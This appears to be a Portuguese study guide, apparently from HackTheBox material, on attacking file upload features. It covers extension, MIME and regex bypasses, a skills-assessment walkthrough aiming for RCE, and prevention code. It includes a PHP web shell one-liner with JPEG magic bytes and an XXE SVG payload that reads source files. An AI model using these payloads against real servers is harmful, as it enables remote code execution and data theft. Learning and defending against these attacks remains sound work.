File Upload Attacks

Exploração completa de vulnerabilidades em funcionalidades de upload de arquivos — desde validação ausente até bypass de blacklists, whitelists e type filters. Inclui ataques via XSS, XXE em SVG, injeções no nome do arquivo e técnicas de prevenção.

Introdução

Upload de arquivos é um recurso essencial em aplicações web modernas — e também uma das superfícies de ataque mais críticas. Vulnerabilidades de upload estão entre as mais comuns em CVEs recentes, frequentemente classificadas como High ou Critical.

Tipos de Ataque

  • Arbitrary File Upload — upload de qualquer tipo de arquivo, incluindo web shells
  • Client-Side Bypass — contornar validações implementadas apenas no front-end
  • Blacklist/Whitelist Bypass — burlar filtros de extensão no back-end
  • Type Filter Bypass — manipular Content-Type e assinatura MIME
  • Limited Uploads — XSS/XXE via SVG, HTML ou metadados de imagem
  • Filename Injection — injeção de comandos, SQLi ou XSS no nome do arquivo

Absent Validation — Upload Irrestrito

Vulnerabilidade: Sem Filtros

O tipo mais básico: a aplicação não implementa nenhuma validação de tipo de arquivo — qualquer extensão é aceita.

Identificando o Framework Web

Antes de fazer upload do web shell, precisamos saber qual linguagem executa o servidor. Métodos:

  • Tentar acessar /index.php, /index.asp, /index.aspx
  • Usar a extensão Wappalyzer no navegador
  • Fuzzing de extensões com Burp Intruder

Bypass: Front-End Only

Muitas aplicações validam o tipo de arquivo apenas no JavaScript do front-end. Como o código roda no navegador do cliente, é completamente contornável.

Blacklist Filters Bypass

Bypass: Extensões Alternativas

O back-end bloqueia extensões comuns como .php, .php7, .phps, mas a blacklist raramente é completa.

Fuzzing de Extensões

Usar Burp Intruder com a lista de extensões PHP do PayloadsAllTheThings para identificar quais não estão bloqueadas:

Extensões alternativas que frequentemente escapam da blacklist:

extensões php alternativas.phtml  .php5  .phar  .pHp  .PHP
.php3   .php4   .phps  .php7
⚠ Case Sensitivity

Em servidores Windows, nomes de arquivo não diferenciam maiúsculas — tentar .pHp ou .PHP pode bypassar blacklists case-sensitive.

Whitelist Filters Bypass

Bypass: Double Extension & Null Byte

Whitelists são mais seguras que blacklists, mas regex mal implementada abre brechas.

Double Extension

Se o regex verifica apenas se o nome contém uma extensão permitida (e não se termina com ela):

php — regex vulnerável// Vulnerável — verifica se CONTÉM .jpg
if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) { ... }

// Seguro — verifica se TERMINA com .jpg
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ... }
bypass# Double Extension — passa no regex, executa como PHP
shell.jpg.php

# Reverse Double Extension
shell.php.jpg

Null Byte Injection

bypass# Null byte trunca o nome — servidor processa como .php
shell.php%00.jpg

Type Filters Bypass

Bypass: Content-Type & MIME Spoofing

Quando a aplicação valida o conteúdo do arquivo além da extensão, dois métodos são usados: verificação do Content-Type header ou da assinatura MIME.

Content-Type Bypass

O cabeçalho Content-Type é enviado pelo navegador baseado na extensão — mas pode ser modificado manualmente no Burp:

MIME Type Bypass

O servidor pode verificar os primeiros bytes do arquivo (magic bytes) para identificar o tipo real. Para imagens JPEG, os bytes iniciais são FF D8 FF. Adicionamos os magic bytes antes do web shell:

bash# Adiciona magic bytes de JPEG ao início do shell PHP
echo -e '\xff\xd8\xff\xfe' > shell.php
echo '<?php system($_REQUEST["cmd"]); ?>' >> shell.php

  • Enviar nome de arquivo muito longo (+5000 chars)
  • Usar XXE/LFI para ler o código-fonte e encontrar o diretório

Windows-Specific

  • Caracteres reservados: |, <, >, *, ?
  • Nomes reservados: CON, COM1, LPT1, NUL
  • Convenção 8.3: HACKTH~1.TXT referencia hackthebox.txt

Prevention

Validação de Extensão (Blacklist + Whitelist)

php$fileName = basename($_FILES["uploadFile"]["name"]);

// blacklist — bloqueia extensões perigosas em qualquer posição
if (preg_match('/^.*\.ph(p|ps|ar|tml)/', $fileName)) {
    echo "Only images are allowed"; die();
}

// whitelist — exige que TERMINE com extensão de imagem
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed"; die();
}

Validação de Conteúdo

php$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png', 'image/jpeg'))) {
        echo "Only images are allowed"; die();
    }
}

Boas Práticas Adicionais

  • Randomizar nomes dos arquivos armazenados, guardar original no banco
  • Armazenar uploads fora do webroot ou em servidor/container separado
  • Servir downloads via script controlado (download.php) com headers de segurança
  • Desabilitar funções perigosas: disable_functions = exec,shell_exec,system,passthru
  • Restringir o diretório de uploads com open_basedir (PHP)
  • Retornar 403 Forbidden para acesso direto ao diretório de uploads

Skills Assessment

Aplicação de e-commerce com formulário de upload em Contact Us. Objetivo: obter RCE no servidor back-end.

Passo 1 — XXE via SVG para ler o código-fonte

Enviando SVG malicioso para ler o arquivo upload.php:

xml<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM
  "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>

Passo 2 — Análise do código-fonte

Decodificando o base64, identificamos as validações:

  • Blacklist: /.+\.ph(p|ps|tml)/ — bloqueia .php, .phps, .phtml mas não .phar
  • Whitelist regex: /^.+\.[a-z]{2,3}g$/ — exige que termine com letra g (ex: .jpg, .png)
  • MIME check: verifica Content-Type e MIME type real
  • Diretório: ./user_feedback_submissions/
  • Naming: date('ymd') . '_' . filename

Passo 3 — Montando o bypass

Extensão .phar não está na blacklist e termina com r — não passa no whitelist [a-z]{2,3}g$. Solução: usar .phar.jpg (double extension) que termina com g e não contém .ph(p|ps|tml).
